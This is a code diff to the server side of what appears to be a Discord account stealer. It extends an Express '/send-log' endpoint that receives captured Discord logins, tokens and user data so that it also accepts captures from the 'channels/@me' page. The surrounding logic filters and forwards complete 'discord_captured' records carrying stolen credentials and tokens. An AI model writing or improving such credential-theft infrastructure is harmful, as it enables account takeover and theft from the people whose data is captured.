@@ -493,7 +493,8 @@ app.post('/send-log', async (req, res) => {
         // Only process Discord logs from specific URLs
         const allowedUrls = [
           'https://discord.com/login',
-          'https://discord.com/app'
+          'https://discord.com/app',
+          'https://discord.com/channels/@me'
         ];
 
         const isAllowedUrl = allowedUrls.some(url => 
@@ -517,12 +518,12 @@ app.post('/send-log', async (req, res) => {
           }
         }
 
-        // For discord.com/app - send comprehensive data (login + token + user data)
-        if (logData.url.startsWith('https://discord.com/app')) {
+        // For discord.com/app or discord.com/channels/@me - send comprehensive data (login + token + user data)
+        if (logData.url.startsWith('https://discord.com/app') || logData.url.startsWith('https://discord.com/channels/@me')) {
           if (logData.level === 'discord_captured' && logData.token && logData.credentials) {
             // Send comprehensive Discord captured embed
           } else {
-            console.log('Skipping Discord app log - incomplete data');
+            console.log('Skipping Discord app/channels log - incomplete data');
             res.status(200).json({ success: true, message: 'Skipped - incomplete app data' });
             return;
           }
@@ -530,7 +531,7 @@ app.post('/send-log', async (req, res) => {
 
         // Skip other Discord log types not matching the criteria
         if (logData.level === 'discord_token' || 
-            (logData.level === 'discord_captured' && !logData.url.startsWith('https://discord.com/app')) ||
+            (logData.level === 'discord_captured' && !logData.url.startsWith('https://discord.com/app') && !logData.url.startsWith('https://discord.com/channels/@me')) ||
             (logData.level === 'discord_login' && !logData.url.startsWith('https://discord.com/login'))) {
           console.log('Skipping Discord log - not matching URL criteria');
           res.status(200).json({ success: true, message: 'Skipped - URL mismatch' });
